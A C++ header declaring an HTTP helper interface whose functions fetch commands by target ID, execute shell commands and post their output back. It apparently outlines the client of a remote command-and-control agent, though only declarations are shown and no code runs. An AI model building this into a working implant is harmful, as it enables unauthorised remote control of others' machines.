#pragma once

#include "require.h"

namespace http
{
	size_t write_function(void* arg_ptr, size_t arg_size, size_t arg_nmemb, std::string* arg_data);
	void init(std::string arg_info);
	std::string get(std::string arg_target_id);
	std::string ssystem(const char* arg_command);
	std::string execute_command(std::string arg_command);
	void post_response(std::string arg_return_string, std::string arg_target_id);
	std::string uuid_as_id();
}